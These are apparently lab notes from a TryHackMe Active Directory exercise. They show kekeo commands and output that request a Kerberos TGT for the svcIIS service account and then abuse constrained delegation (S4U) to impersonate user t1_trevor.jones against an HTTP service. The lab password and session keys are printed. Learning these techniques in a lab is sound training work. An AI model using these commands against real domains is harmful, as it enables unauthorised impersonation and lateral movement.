
Generate TGT Ticket

```
kekeo # tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password
:Password1@ 

Realm        : za.tryhackme.loc (za) 
User         : svcIIS (svcIIS)
CName        : svcIIS   [KRB_NT_PRINCIPAL (1)]
SName        : krbtgt/za.tryhackme.loc  [KRB_NT_SRV_INST (2)]   
Need PAC     : Yes
Auth mode    : ENCRYPTION KEY 23 (rc4_hmac_nt      ): 43460d636f
269c709b20049cee36ae7a
[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.60.101 (auto)
  > Ticket in file 'TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhac
kme.loc@ZA.TRYHACKME.LOC.kirbi'

```

T1 user impersonation
```
kekeo # tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_trevor.
jones /service:http/THMSERVER1.za.tryhackme.locTicket: 

TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi   [krb-cred]     S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC  [krb-cred]     E: [00000012] aes256_hmac
  [enc-krb-cred] P: svcIIS @ ZA.TRYHACKME.LOC  [enc-krb-cred] S: krbtgt/za.tryhackme.loc @ ZA.TRYHACKME.LOC  [enc-krb-cred] T: [2/2/2024 3:53:45 PM ; 2/3/2024 1:53:45 AM] {R:2/9/2024 3:53:45 PM}  [enc-krb-cred] F: [40e10000] name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;  
  [enc-krb-cred] K: ENCRYPTION KEY 18 (aes256_hmac      ): 2b11359c4727e81548570cecc4eacd5931219c94bf5167666580ed0b23cee03a  [s4u2self]  t1_trevor.jones[kdc] name: THMDC.za.tryhackme.loc (auto)
[kdc] addr: 10.200.60.101 (auto)  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_svcIIS@ZA.TRYHACKME.LOC.kirbi' Service(s):
  [s4u2proxy] http/THMSERVER1.za.tryhackme.loc 
  > Ticket in file 'TGS_t1_trevor.jones@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi'


```